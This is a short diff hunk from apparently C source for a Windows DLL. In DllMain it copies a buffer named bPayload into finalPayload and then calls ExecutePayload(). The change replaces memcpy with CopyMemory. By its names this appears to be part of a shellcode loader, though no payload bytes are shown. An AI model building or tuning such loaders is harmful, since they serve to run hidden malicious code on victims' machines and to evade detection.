@@ -60,7 +60,7 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
       if (STATUS != 0) {
         return 1;
       }
-      memcpy(finalPayload, bPayload, SCSIZE);
+      CopyMemory(finalPayload, bPayload, SCSIZE);
 			ExecutePayload();
 			break;
 
